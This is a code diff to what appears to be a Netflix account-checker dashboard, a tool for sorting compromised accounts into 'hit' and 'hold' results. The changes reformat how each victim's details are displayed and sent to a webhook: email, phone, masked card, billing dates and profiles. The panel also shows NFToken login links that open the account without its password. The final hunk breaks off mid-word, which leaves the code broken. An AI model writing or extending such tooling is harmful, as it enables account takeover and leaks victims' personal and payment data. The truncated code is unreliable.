@@ -1042,11 +1042,18 @@ async function sendWebhookFromFrontend(r, cfg) {
     `**📺 STREAMS:** ${info.max_streams || 'N/A'}`,
     `**💰 PRICE:** ${info.plan_price || 'N/A'}`,
     `**⏸️ HOLD STATUS:** ${info.hold_status || 'N/A'}`,
-    `**👥 EXTRA MEMBER:** ${info.extra_members || 'N/A'}`,
     `**✅ EMAIL VERIFIED:** ${info.email_verified || 'N/A'}`,
     `**🛡️ MEMBERSHIP STATUS:** ${info.membership_status || 'N/A'}`,
-    `**🎭 PROFILES:** ${info.profiles || 'N/A'}`
+    `**🎭 PROFILES (${info.profile_count || 1}):** ${info.profiles || 'N/A'}`
   ];
+
+  if (info.payment_method === 'CC' && info.masked_card && info.masked_card !== 'N/A') {
+    descLines.splice(7, 0, `**💳 CARD:** ${info.masked_card}`);
+  }
+  if (info.extra_members === 'Yes') {
+    const idx = descLines.findIndex(l => l.includes('HOLD STATUS'));
+    descLines.splice(idx + 1, 0, `**👥 EXTRA MEMBER:** Yes`);
+  }
 
   if (r.nftoken && r.nftoken.token) {
     const t = r.nftoken.token;
@@ -1128,13 +1135,13 @@ function getDetailHTML(r, isCloud = false) {
   const info=r.info||{}; const cfg=getConfig(); const tf=cfg.txt_fields||{};
   const FREE_HIDDEN=new Set(['member_since','next_billing','payment_method','card','phone','quality','max_streams','plan_price','extra_members','membership_status']);
   const sub=['hit','hold'].includes(r.status);
-  const profileLabel=info.profile_count?`Profiles (${info.profile_count})`:'Profiles';
+  const profileLabel=info.profile_count?`PROFILES (${info.profile_count})`:'PROFILES (1)';
 
   const ROWS=[
-    ['name','👤 Name'],['email','📧 Email'],['country','🌍 Country'],['plan','📦 Plan'],['member_since','📅 Member Since'],['next_billing','🗓️ Next Billing'],
-    ['payment_method','💳 Payment'],['card','💳 Card'],['phone','📱 Phone'],['quality','🎞️ Quality'],['max_streams','📺 Streams'],['plan_price','💰 Price'],
-    ['hold_status','⏸️ Hold Status'],['extra_members','👥 Extra Member'],['email_verified','✅ Email Verified'],['membership_status','🛡️ Membership Status'],
-    ['profiles',`🎭 ${profileLabel}`],['user_guid','🆔 User GUID']
+    ['name','👤 NAME'],['email','📧 EMAIL'],['country','🌍 COUNTRY'],['plan','📦 PLAN'],['member_since','📅 MEMBER SINCE'],['next_billing','🗓️ NEXT BILLING'],
+    ['payment_method','💳 PAYMENT'],['card','💳 CARD'],['phone','📱 PHONE'],['quality','🎞️ QUALITY'],['max_streams','📺 STREAMS'],['plan_price','💰 PRICE'],
+    ['hold_status','⏸️ HOLD STATUS'],['extra_members','👥 EXTRA MEMBER'],['email_verified','✅ EMAIL VERIFIED'],['membership_status','🛡️ MEMBERSHIP STATUS'],
+    ['profiles',`🎭 ${profileLabel}`],['user_guid','🆔 USER GUID']
   ];
   const rows=ROWS.filter(([k])=>{
     if(!sub&&FREE_HIDDEN.has(k)) return false; if(k==='card'&&info.payment_method!=='CC') return false;
@@ -1149,7 +1156,7 @@ function getDetailHTML(r, isCloud = false) {
   if(nft&&nft.token){
     const t=nft.token; const exp=nft.expires_at_utc||'—';
     const pcUrl=`https://netflix.com/?nftoken=${encodeURIComponent(t)}`; const mobUrl=`https://netflix.com/unsupported?nftoken=${encodeURIComponent(t)}`;
-    nftHtml=`<div class="nft-section"><div class="nft-title">🔑 NFToken</div><div class="nft-links"><a class="nft-link" href="${esc(pcUrl)}" target="_blank">🖥️ PC Login</a><a class="nft-link" href="${esc(mobUrl)}" target="_blank">📱 Phone Login</a></div><div class="nft-expiry">Valid Till (UTC): ${esc(exp)}</div></div>`;
+    nftHtml=`<div class="nft-section"><div class="nft-title">🔑 NFTOKEN</div><div class="nft-links"><a class="nft-link" href="${esc(pcUrl)}" target="_blank">🖥️ PC Login</a><a class="nft-link" href="${esc(mobUrl)}" target="_blank">📱 Phone Login</a></div><div class="nft-expiry">Valid Till (UTC): ${esc(exp)}</div></div>`;
   }
 
   const dlName=`netflix_${country||'xx'}_${Date.now()}.txt`;
@@ -1814,15 +1821,4 @@ async function submitKeyPass() {
   if (newPass.length < 4) return errEl.textContent = 'Mật khẩu phải có ít nhất 4 ký tự!';
   errEl.textContent = 'Đang xử lý...';
   // Admin reset: gửi theo keyId, không cần MK cũ
-  const res = await apiFetch(`/api/keys/${_keyPassId}/password`, 'POST', { password: newPass });
-  if(res && res.ok) {
-    closeModal('keyPassModal');
-    toast('Đã reset mật khẩu Key ✓');
-    loadAdminKeys();
-  } else {
-    errEl.textContent = res?.error || 'Lỗi không xác định';
-  }
-}
-</script>
-</body>
-</html>
+  const res = await apiFetc
